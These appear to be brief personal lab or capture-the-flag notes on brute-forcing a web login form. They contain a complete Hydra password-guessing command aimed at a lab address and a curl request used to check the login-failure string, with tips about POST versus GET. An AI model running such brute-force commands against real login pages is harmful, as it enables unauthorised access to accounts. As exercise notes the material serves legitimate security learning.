


user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-post-form "/login-get/index.php:username=^USER^&password=^PASS^:F=Login failed" -f

when http is mad annoying check what you get back when its failed
when checking for login try to do http-post

-when i did get with the right creds i still got the login failed page because it didnt really post and submitted the creds


#### Verify the string Hydra will look for (local check)

send a manual POST and show a short snippet

curl -s -X POST 'http://10.10.105.184/login-post/index.php' \
  -d 'username=burgess&password=wrong' -i | sed -n '1,120p'     # h
